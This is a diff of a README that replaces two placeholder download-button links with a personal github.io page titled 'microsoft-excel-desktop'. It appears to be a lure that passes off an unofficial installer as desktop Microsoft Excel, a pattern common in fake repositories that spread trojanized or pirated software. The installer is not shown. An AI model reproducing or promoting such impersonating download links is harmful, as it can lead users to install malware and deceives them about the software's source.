@@ -17,7 +17,7 @@ The distribution supports both portable and installed modes from a single artifa
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://cambryant2004.github.io/microsoft-excel-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ The distribution coexists with other spreadsheet installations because it isolat
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://cambryant2004.github.io/microsoft-excel-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
